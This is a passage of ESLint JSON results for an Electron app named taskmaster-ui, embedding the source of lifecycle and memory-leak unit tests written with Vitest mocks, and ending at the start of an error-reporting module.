    writable: true\n      })\n      \n      // Test dock operations\n      if (app.dock) {\n        app.dock.hide()\n        expect(app.dock.hide).toHaveBeenCalled()\n        \n        app.dock.show()\n        expect(app.dock.show).toHaveBeenCalled()\n        \n        app.dock.setBadge('5')\n        expect(app.dock.setBadge).toHaveBeenCalledWith('5')\n      }\n      \n      // Restore original platform\n      Object.defineProperty(process, 'platform', {\n        value: originalPlatform,\n        writable: true\n      })\n    })\n  })\n\n  describe('Memory and Resource Management', () => {\n    test('should clean up resources on app quit', () => {\n      const mockCallback = vi.fn()\n      \n      app.on('before-quit', mockCallback)\n      \n      // Simulate cleanup on quit\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'before-quit')?.[1]\n      if (eventCallback) {\n        eventCallback({ preventDefault: vi.fn() })\n        expect(mockCallback).toHaveBeenCalled()\n      }\n    })\n\n    test('should handle IPC cleanup', () => {\n      const { ipcMain } = require('electron')\n      \n      // Test IPC handler cleanup\n      ipcMain.removeAllListeners('test-channel')\n      expect(ipcMain.removeAllListeners).toHaveBeenCalledWith('test-channel')\n      \n      ipcMain.removeHandler('test-handler')\n      expect(ipcMain.removeHandler).toHaveBeenCalledWith('test-handler')\n    })\n  })\n\n  describe('Event Sequencing and Timing', () => {\n    test('should fire events in correct order', async () => {\n      const eventOrder: string[] = []\n      \n      // Mock event handlers that record order\n      const willFinishHandler = vi.fn(() => eventOrder.push('will-finish-launching'))\n      const readyHandler = vi.fn(() => eventOrder.push('ready'))\n      \n      app.on('will-finish-launching', willFinishHandler)\n      app.on('ready', readyHandler)\n      \n      // Simulate event firing order\n      const willFinishCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'will-finish-launching')?.[1]\n      const readyCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'ready')?.[1]\n      \n      if (willFinishCallback && readyCallback) {\n        willFinishCallback()\n        readyCallback()\n        \n        expect(eventOrder).toEqual(['will-finish-launching', 'ready'])\n      }\n    })\n\n    test('should handle rapid event succession', () => {\n      const mockCallback = vi.fn()\n      \n      app.on('activate', mockCallback)\n      \n      // Simulate rapid activate events\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'activate')?.[1]\n      if (eventCallback) {\n        eventCallback()\n        eventCallback()\n        eventCallback()\n        \n        expect(mockCallback).toHaveBeenCalledTimes(3)\n      }\n    })\n  })\n\n  describe('Error Recovery and Stability', () => {\n    test('should maintain stability after renderer crashes', () => {\n      const mockWindow = {\n        webContents: {\n          on: vi.fn(),\n          reload: vi.fn()\n        }\n      }\n      \n      const crashHandler = vi.fn((_event, details) => {\n        // Simulate recovery action\n        if (details.reason === 'crashed') {\n          mockWindow.webContents.reload()\n        }\n      })\n      \n      mockWindow.webContents.on('render-process-gone', crashHandler)\n      \n      // Simulate crash\n      const eventCallback = mockWindow.webContents.on.mock.calls.find(\n        call => call[0] === 'render-process-gone'\n      )?.[1]\n      \n      if (eventCallback) {\n        eventCallback({}, { reason: 'crashed', exitCode: 1 })\n        expect(crashHandler).toHaveBeenCalled()\n        expect(mockWindow.webContents.reload).toHaveBeenCalled()\n      }\n    })\n\n    test('should handle graceful degradation', () => {\n      // Test that app continues to function even with errors\n      expect(app.isReady()).toBe(true)\n      \n      try {\n        throw new Error('Simulated error')\n      } catch {\n        // App should remain stable\n        expect(app.isReady()).toBe(true)\n      }\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/memory-leak-detection.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/memory-leaks.test.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":149,"column":33,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":149,"endColumn":41},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":239,"column":9,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":239,"endColumn":46,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[6919,6919],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[6919,6919],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":266,"column":24,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":266,"endColumn":32}],"suppressedMessages":[],"errorCount":3,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Memory Leak Detection Tests (2025)\n * \n * Comprehensive testing of memory management in Electron applications\n * including window lifecycle, IPC handler cleanup, event listener management,\n * and resource disposal following 2025 best practices with MemLab integration.\n */\n\nimport { describe, test, expect, beforeEach, afterEach, vi } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { app, BrowserWindow, ipcMain, webContents, session } from 'electron'\nimport { EventEmitter } from 'events'\nimport { TestWindowManager, cleanupTestWindows } from '../../../tests/utils/window-manager'\n\n// Mock electron modules\nvi.mock('electron', () => ({\n  app: {\n    on: vi.fn(),\n    once: vi.fn(),\n    removeListener: vi.fn(),\n    removeAllListeners: vi.fn(),\n    quit: vi.fn(),\n    whenReady: vi.fn().mockResolvedValue(undefined)\n  },\n  BrowserWindow: vi.fn().mockImplementation(() => {\n    const win = new EventEmitter()\n    Object.assign(win, {\n      id: Math.random(),\n      loadURL: vi.fn().mockResolvedValue(undefined),\n      loadFile: vi.fn().mockResolvedValue(undefined),\n      on: vi.fn(),\n      once: vi.fn(),\n      removeListener: vi.fn(),\n      removeAllListeners: vi.fn(),\n      close: vi.fn(),\n      destroy: vi.fn(),\n      isDestroyed: vi.fn().mockReturnValue(false),\n      webContents: {\n        id: Math.random(),\n        on: vi.fn(),\n        once: vi.fn(),\n        removeListener: vi.fn(),\n        removeAllListeners: vi.fn(),\n        session: {\n          clearCache: vi.fn().mockResolvedValue(undefined),\n          clearStorageData: vi.fn().mockResolvedValue(undefined),\n          flushStorageData: vi.fn().mockResolvedValue(undefined)\n        },\n        debugger: {\n          attach: vi.fn(),\n          detach: vi.fn(),\n          sendCommand: vi.fn()\n        }\n      }\n    })\n    return win\n  }),\n  ipcMain: {\n    handle: vi.fn(),\n    handleOnce: vi.fn(),\n    on: vi.fn(),\n    once: vi.fn(),\n    removeHandler: vi.fn(),\n    removeAllListeners: vi.fn(),\n    listenerCount: vi.fn().mockReturnValue(0)\n  },\n  webContents: {\n    getAllWebContents: vi.fn().mockReturnValue([])\n  },\n  session: {\n    defaultSession: {\n      getAllExtensions: vi.fn().mockReturnValue({\n                    on: vi.fn(),\n                    off: vi.fn(),\n                    once: vi.fn(),\n                    addListener: vi.fn(),\n                    removeListener: vi.fn(),\n                    webContents: { send: vi.fn() }\n                  } as any),\n      removeExtension: vi.fn(),\n      clearCache: vi.fn().mockResolvedValue(undefined)\n    }\n  }\n}))\n\n// Memory tracking utilities\nclass MemoryTracker {\n  private baselineMemory: number = 0\n  private measurements: number[] = []\n  \n  public takeBaseline(): void {\n    if (global.gc) {\n      global.gc() // Force garbage collection if available\n    }\n    this.baselineMemory = process.memoryUsage().heapUsed\n    this.measurements = []\n  }\n  \n  public measure(): number {\n    if (global.gc) {\n      global.gc()\n    }\n    const currentMemory = process.memoryUsage().heapUsed\n    const delta = currentMemory - this.baselineMemory\n    this.measurements.push(delta)\n    return delta\n  }\n  \n  public getGrowthTrend(): 'stable' | 'growing' | 'shrinking' {\n    if (this.measurements.length < 3) return 'stable'\n    \n    // Simple linear regression to detect trend\n    const n = this.measurements.length\n    const sumX = (n * (n - 1)) / 2\n    const sumY = this.measurements.reduce((a, b) => a + b, 0)\n    const sumXY = this.measurements.reduce((sum, y, x) => sum + x * y, 0)\n    const sumX2 = (n * (n - 1) * (2 * n - 1)) / 6\n    \n    const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX)\n    \n    // Threshold for considering growth significant (1KB per iteration)\n    const threshold = 1024\n    \n    if (slope > threshold) return 'growing'\n    if (slope < -threshold) return 'shrinking'\n    return 'stable'\n  }\n  \n  public getMaxGrowth(): number {\n    return Math.max(...this.measurements, 0)\n  }\n}\n\n// Extend our imported TestWindowManager with IPC handler functionality\nclass ExtendedTestWindowManager extends TestWindowManager {\n  private handlers: Map<string, Function> = new Map()\n  private windowToIdMap: Map<BrowserWindow, string> = new Map()\n  \n  // Override createWindow to track window-to-id mapping\n  public createWindow(options: any = {}): BrowserWindow {\n    const id = options.id || `mem-test-${Date.now()}-${Math.random()}`\n    const window = super.createWindow({ ...options, id })\n    this.windowToIdMap.set(window, id)\n    return window\n  }\n  \n  // Add helper method to destroy by window instance\n  public destroyWindow(windowOrId: BrowserWindow | string): void {\n    if (typeof windowOrId === 'string') {\n      super.destroyWindow(windowOrId)\n    } else {\n      const id = this.windowToIdMap.get(windowOrId)\n      if (id) {\n        this.windowToIdMap.delete(windowOrId)\n        super.destroyWindow(id)\n      }\n    }\n  }\n  \n  // Override destroyAllWindows to clear mapping\n  public async destroyAllWindows(): Promise<void> {\n    await super.destroyAllWindows()\n    this.windowToIdMap.clear()\n  }\n  \n  public setupIpcHandlers(): void {\n    const handlers = [\n      'app:get-version',\n      'app:get-platform',\n      'fs:read-file',\n      'fs:write-file',\n      'db:query'\n    ]\n    \n    handlers.forEach(channel => {\n      const handler = async (_event: any, ...args: any[]) => {\n        // Simulate some work\n        return { channel, args }\n      }\n      \n      ipcMain.handle(channel, handler)\n      this.handlers.set(channel, handler)\n    })\n  }\n  \n  public cleanupIpcHandlers(): void {\n    for (const [channel] of this.handlers) {\n      ipcMain.removeHandler(channel)\n    }\n    this.handlers.clear()\n    ipcMain.removeAllListeners()\n  }\n}\n\ndescribe('Memory Leak Detection Tests (2025)', () => {\n  let memoryTracker: MemoryTracker\n  let windowManager: ExtendedTestWindowManager\n  \n  beforeEach(() => {\n    vi.clearAllMocks()\n    memoryTracker = new MemoryTracker()\n    windowManager = new ExtendedTestWindowManager({\n      defaultTimeout: 30000,\n      maxWindows: 20,\n      showWindows: false,\n      enableLogging: process.env.DEBUG === 'true'\n    })\n  })\n\n  afterEach(async () => {\n    windowManager.cleanupIpcHandlers()\n    await windowManager.destroyAllWindows()\n    await cleanupTestWindows()\n    vi.restoreAllMocks()\n  })\n\n  describe('Window Lifecycle Memory Management', () => {\n    test('should not leak memory when creating and destroying windows', () => {\n      memoryTracker.takeBaseline()\n      \n      // Create and destroy windows multiple times\n      for (let i = 0; i < 10; i++) {\n        const window = windowManager.createWindow()\n        \n        // Simulate some window operations\n        window.loadURL('https://example.com')\n        window.webContents.on('did-finish-load', () => {})\n        window.on('resize', () => {})\n        \n        // Destroy the window\n        windowManager.destroyWindow(window)\n        \n        // Measure memory after each iteration\n        memoryTracker.measure()\n      }\n      \n      // Check memory growth trend\n      const trend = memoryTracker.getGrowthTrend()\n      const maxGrowth = memoryTracker.getMaxGrowth()\n      \n      // Memory should be stable or shrinking after GC\n      expect(trend).not.toBe('growing')\n      \n      // Maximum growth should be reasonable (less than 10MB)\n      expect(maxGrowth).toBeLessThan(10 * 1024 * 1024)\n      \n      // All windows should be cleaned up\n      expect(windowManager.getWindowCount()).toBe(0)\n    })\n\n    test('should clean up event listeners properly', () => {\n      const window = windowManager.createWindow()\n      const listeners: Function[] = []\n      \n      // Add multiple listeners\n      for (let i = 0; i < 100; i++) {\n        const listener = vi.fn()\n        window.on('resize', listener)\n        window.webContents.on('did-navigate', listener)\n        listeners.push(listener)\n      }\n      \n      // Verify listeners were added\n      expect(window.on).toHaveBeenCalledTimes(100)\n      expect(window.webContents.on).toHaveBeenCalledTimes(100)\n      \n      // Destroy window should remove all listeners\n      windowManager.destroyWindow(window)\n      \n      expect(window.removeAllListeners).toHaveBeenCalled()\n      expect(window.webContents.removeAllListeners).toHaveBeenCalled()\n    })\n\n    test('should handle rapid window creation/destruction', async () => {\n      memoryTracker.takeBaseline()\n      \n      // Create windows rapidly\n      const promises = []\n      for (let i = 0; i < 20; i++) {\n        promises.push(\n          new Promise<void>((resolve) => {\n            const window = windowManager.createWindow()\n            \n            // Simulate async operations\n            setTimeout(() => {\n              windowManager.destroyWindow(window)\n              memoryTracker.measure()\n              resolve()\n            }, Math.random() * 100)\n          })\n        )\n      }\n      \n      await Promise.all(promises)\n      \n      // Check final state\n      expect(windowManager.getWindowCount()).toBe(0)\n      \n      const trend = memoryTracker.getGrowthTrend()\n      expect(trend).not.toBe('growing')\n    })\n  })\n\n  describe('IPC Handler Memory Management', () => {\n    test('should not leak memory with IPC handlers', () => {\n      memoryTracker.takeBaseline()\n      \n      // Add and remove handlers multiple times\n      for (let i = 0; i < 10; i++) {\n        windowManager.setupIpcHandlers()\n        \n        // Simulate IPC calls\n        const mockEvent = { sender: { id: 1 } }\n        ipcMain.handle.mock.calls.forEach(([, handler]) => {\n          handler(mockEvent, 'test-data')\n        })\n        \n        windowManager.cleanupIpcHandlers()\n        memoryTracker.measure()\n      }\n      \n      // Check memory stability\n      const trend = memoryTracker.getGrowthTrend()\n      expect(trend).not.toBe('growing')\n      \n      // Verify all handlers were removed\n      expect(ipcMain.removeHandler).toHaveBeenCalled()\n      expect(ipcMain.removeAllListeners).toHaveBeenCalled()\n    })\n\n    test('should handle handler reference cleanup', () => {\n      const handlers = new WeakMap()\n      const channels: string[] = []\n      \n      // Setup handlers with weak references\n      for (let i = 0; i < 100; i++) {\n        const channel = `test:channel:${i}`\n        const handler = async () => ({ result: i })\n        \n        ipcMain.handle(channel, handler)\n        handlers.set(handler, channel)\n        channels.push(channel)\n      }\n      \n      // Remove all handlers\n      channels.forEach(channel => {\n        ipcMain.removeHandler(channel)\n      })\n      \n      // Verify cleanup\n      expect(ipcMain.removeHandler).toHaveBeenCalledTimes(100)\n      expect(ipcMain.listenerCount()).toBe(0)\n    })\n\n    test('should prevent duplicate handler registration', () => {\n      const setupSecureHandlers = () => {\n        const registeredHandlers = new Set<string>()\n        \n        const safeHandle = (channel: string, handler: (event: Electron.IpcMainInvokeEvent, ...args: any[]) => any) => {\n          if (registeredHandlers.has(channel)) {\n            ipcMain.removeHandler(channel)\n          }\n          ipcMain.handle(channel, handler)\n          registeredHandlers.add(channel)\n        }\n        \n        // Register handlers\n        safeHandle('app:test', async () => 'result1')\n        safeHandle('app:test', async () => 'result2') // Should remove first handler\n        \n        return registeredHandlers\n      }\n      \n      const handlers = setupSecureHandlers()\n      \n      // Should have removed the first handler before adding the second\n      expect(ipcMain.removeHandler).toHaveBeenCalledWith('app:test')\n      expect(handlers.size).toBe(1)\n    })\n  })\n\n  describe('Session and Cache Management', () => {\n    test('should clean up session data properly', async () => {\n      const window = windowManager.createWindow()\n      \n      // Simulate session data accumulation\n      const session = window.webContents.session\n      \n      // Load multiple pages\n      for (let i = 0; i < 10; i++) {\n        await window.loadURL(`https://example.com/page${i}`)\n      }\n      \n      // Clean up session data\n      await session.clearCache()\n      await session.clearStorageData()\n      await session.flushStorageData()\n      \n      // Verify cleanup methods were called\n      expect(session.clearCache).toHaveBeenCalled()\n      expect(session.clearStorageData).toHaveBeenCalled()\n      expect(session.flushStorageData).toHaveBeenCalled()\n      \n      windowManager.destroyWindow(window)\n    })\n\n    test('should handle extension cleanup', () => {\n      const extensions = {\n        'ext1': { id: 'ext1', name: 'Extension 1' },\n        'ext2': { id: 'ext2', name: 'Extension 2' }\n      }\n      \n      session.defaultSession.getAllExtensions = vi.fn().mockReturnValue(extensions)\n      \n      // Clean up all extensions\n      const cleanupExtensions = () => {\n        const allExtensions = session.defaultSession.getAllExtensions()\n        Object.keys(allExtensions).forEach(id => {\n          session.defaultSession.removeExtension(id)\n        })\n      }\n      \n      cleanupExtensions()\n      \n      expect(session.defaultSession.removeExtension).toHaveBeenCalledWith('ext1')\n      expect(session.defaultSession.removeExtension).toHaveBeenCalledWith('ext2')\n    })\n  })\n\n  describe('WebContents Memory Management', () => {\n    test('should track all webContents instances', () => {\n      const windows: BrowserWindow[] = []\n      const webContentsSet = new Set()\n      \n      // Create multiple windows\n      for (let i = 0; i < 5; i++) {\n        const window = windowManager.createWindow()\n        windows.push(window)\n        webContentsSet.add(window.webContents)\n      }\n      \n      // Mock getAllWebContents\n      webContents.getAllWebContents = vi.fn().mockReturnValue(Array.from(webContentsSet))\n      \n      // Verify all webContents are tracked\n      expect(webContents.getAllWebContents()).toHaveLength(5)\n      \n      // Destroy windows and verify cleanup\n      windows.forEach(window => windowManager.destroyWindow(window))\n      \n      // In real scenario, getAllWebContents would return empty array\n      webContents.getAllWebContents = vi.fn().mockReturnValue([])\n      expect(webContents.getAllWebContents()).toHaveLength(0)\n    })\n\n    test('should clean up debugger attachments', () => {\n      const window = windowManager.createWindow()\n      const debuggerApi = window.webContents.debugger\n      \n      // Attach debugger\n      debuggerApi.attach('1.3')\n      \n      // Verify attached\n      expect(debuggerApi.attach).toHaveBeenCalledWith('1.3')\n      \n      // Cleanup function\n      const cleanupDebugger = () => {\n        try {\n          debuggerApi.detach()\n        } catch {\n          // Ignore errors if already detached\n        }\n      }\n      \n      // Clean up before destroying window\n      cleanupDebugger()\n      expect(debuggerApi.detach).toHaveBeenCalled()\n      \n      windowManager.destroyWindow(window)\n    })\n  })\n\n  describe('Global Resource Cleanup', () => {\n    test('should clean up app-level event listeners', () => {\n      const listeners = []\n      \n      // Register app-level listeners\n      const events = ['ready', 'window-all-closed', 'before-quit', 'will-quit', 'quit']\n      \n      events.forEach(event => {\n        const listener = vi.fn()\n        app.on(event, listener)\n        listeners.push({ event, listener })\n      })\n      \n      // Cleanup function\n      const cleanupAppListeners = () => {\n        listeners.forEach(({ event, listener }) => {\n          app.removeListener(event, listener)\n        })\n      }\n      \n      cleanupAppListeners()\n      \n      // Verify all listeners were removed\n      expect(app.removeListener).toHaveBeenCalledTimes(events.length)\n    })\n\n    test('should track and limit total window count', () => {\n      const maxWindows = 10\n      const windowTracker = {\n        count: 0,\n        max: maxWindows,\n        \n        canCreateWindow(): boolean {\n          return this.count < this.max\n        },\n        \n        registerWindow(): void {\n          if (!this.canCreateWindow()) {\n            throw new Error('Maximum window limit reached')\n          }\n          this.count++\n        },\n        \n        unregisterWindow(): void {\n          this.count = Math.max(0, this.count - 1)\n        }\n      }\n      \n      // Create windows up to limit\n      for (let i = 0; i < maxWindows; i++) {\n        expect(windowTracker.canCreateWindow()).toBe(true)\n        windowTracker.registerWindow()\n      }\n      \n      // Should not be able to create more\n      expect(windowTracker.canCreateWindow()).toBe(false)\n      expect(() => windowTracker.registerWindow()).toThrow('Maximum window limit reached')\n      \n      // Clean up some windows\n      windowTracker.unregisterWindow()\n      windowTracker.unregisterWindow()\n      \n      // Should be able to create again\n      expect(windowTracker.canCreateWindow()).toBe(true)\n      expect(windowTracker.count).toBe(8)\n    })\n  })\n\n  describe('Memory Profiling Integration', () => {\n    test('should support heap snapshot analysis', async () => {\n      // Mock heap snapshot functionality\n      \n      // Mock debugger command\n      const mockWindow = windowManager.createWindow()\n      mockWindow.webContents.debugger.sendCommand = vi.fn().mockResolvedValue({\n        nodes: [],\n        edges: [],\n        strings: []\n      })\n      \n      const snapshot = await mockWindow.webContents.debugger.sendCommand('HeapProfiler.takeHeapSnapshot')\n      \n      expect(mockWindow.webContents.debugger.sendCommand).toHaveBeenCalledWith('HeapProfiler.takeHeapSnapshot')\n      expect(snapshot).toHaveProperty('nodes')\n      expect(snapshot).toHaveProperty('edges')\n      \n      windowManager.destroyWindow(mockWindow)\n    })\n\n    test('should detect memory growth patterns', () => {\n      const detector = {\n        samples: [] as number[],\n        threshold: 0.1, // 10% growth threshold\n        \n        addSample(heapUsed: number): void {\n          this.samples.push(heapUsed)\n          if (this.samples.length > 10) {\n            this.samples.shift() // Keep only last 10 samples\n          }\n        },\n        \n        detectLeak(): boolean {\n          if (this.samples.length < 5) return false\n          \n          const firstHalf = this.samples.slice(0, 5).reduce((a, b) => a + b, 0) / 5\n          const secondHalf = this.samples.slice(5).reduce((a, b) => a + b, 0) / 5\n          \n          const growthRate = (secondHalf - firstHalf) / firstHalf\n          return growthRate > this.threshold\n        }\n      }\n      \n      // Simulate stable memory\n      for (let i = 0; i < 10; i++) {\n        detector.addSample(100 * 1024 * 1024 + Math.random() * 1024 * 1024) // ~100MB\n      }\n      expect(detector.detectLeak()).toBe(false)\n      \n      // Simulate memory leak\n      detector.samples = []\n      for (let i = 0; i < 10; i++) {\n        detector.addSample((100 + i * 5) * 1024 * 1024) // Growing memory\n      }\n      expect(detector.detectLeak()).toBe(true)\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/mocked-apis.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/mocked-electron-apis.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/errorReporting.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":45,"column":20,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":45,"endColumn":23,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1251,1254],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1251,1254],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":52,"column":12,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":52,"endColumn":15,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1424,1427],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1424,1427],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":75,"column":27,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":75,"endColumn":30,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1950,1953],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1950,1953],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":200,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":203,"endColumn":10,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[5680,5680],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[5680,5680],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":209,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":213,"endColumn":10,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[6023,6023],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[6023,6023],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":219,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":225,"endColumn":10,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[6404,6404],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[6404,6404],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":230,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":236,"endColumn":10,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[6767,6767],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[6767,6767],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":241,"column":7,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":245,"endColumn":10,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[7139,7139],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[7139,7139],"text":"await "},"desc":"Add await operator."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":299,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":299,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8850,8853],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8850,8853],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":353,"column":48,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":353,"endColumn":51,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10333,10336],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10333,10336],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":383,"column":56,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":383,"endColumn":59,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11121,11124],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11121,11124],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":401,"column":48,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":401,"endColumn":51,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11634,11637],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11634,11637],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":403,"column":21,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":403,"endColumn":24,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11706,11709],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11706,11709],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":420,"column":89,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":420,"endColumn":92,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12152,12155],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12152,12155],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":472,"column":24,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":472,"endColumn":27,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13564,13567],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13564,13567],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":5,"fatalErrorCount":0,"warningCount":10,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Main Process Error Reporting (2025)\n * \n * Error reporting and telemetry for Electron main process with IPC integration\n * for communicating with renderer process monitoring systems.\n * \n * Following 2025 patterns for cross-process error monitoring and resilience.\n 